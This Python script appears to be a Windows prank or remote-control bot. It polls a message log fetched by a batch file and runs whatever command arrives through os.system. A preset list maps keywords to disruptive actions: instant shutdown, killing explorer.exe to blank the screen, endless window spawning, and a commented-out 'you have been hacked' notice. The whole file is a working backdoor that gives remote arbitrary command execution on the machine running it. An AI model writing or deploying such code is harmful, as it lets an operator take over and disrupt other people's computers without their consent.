import os
import time
import json
os.system("oneline_.bat")
custom_list={
    "off": "shutdown -s -t 1",
    "hacker": "start tree_.bat",
    #"message:hacked": 'echo you have been hacked > "c:/users/%username%/desktop/msg.txt" & start "c:/users/%username%/desktop/msg.txt"',
    "rickroll": 'start "C:/Program Files (x86)/Google/Chrome/Application/chrome.exe" "https://www.youtube.com/watch?v=dQw4w9WgXcQ"',
    "infinite_window": "start /min infinite_window.bat",
    "black_screen": "taskkill /IM explorer.exe /F",
    "infw_v2": "start /min infw_v2.bat",
    "test": "oneline_.bat",
    "web": "web_.bat",
    "msg": "start /min msg_.bat"
}
def done():
    os.system("done.bat")
def read():
    os.system("read.bat")
    time.sleep(4)
    log_=open("log.txt", "r+")
    log=json.loads(log_.read())
    print("===========================================================")
    print(log)
    cmd=log[0]["content"]
    return cmd
def act(cmd):
    if cmd.split(">>>")[0]=="":
        if len(cmd.split(">>>"))==3:
            custom_v2(cmd.split(">>>")[1],cmd.split(">>>")[2])
        else:
            custom(cmd.split(">>>")[1])
    else:
        prompt(cmd)
def prompt(cmd):
    os.system(cmd)
def custom(cmd):
    os.system(custom_list[cmd])
def custom_v2(cmd,arg):
    os.system(custom_list[cmd]+" "+arg)
while True:
    time.sleep(1)
    cmd=read()
    print("===========================================================")
    print("===========================================================")
    print(cmd)
    print("===========================================================")
    print("===========================================================")
    if not (cmd=="done" or cmd==None):
        act(cmd)
        done()
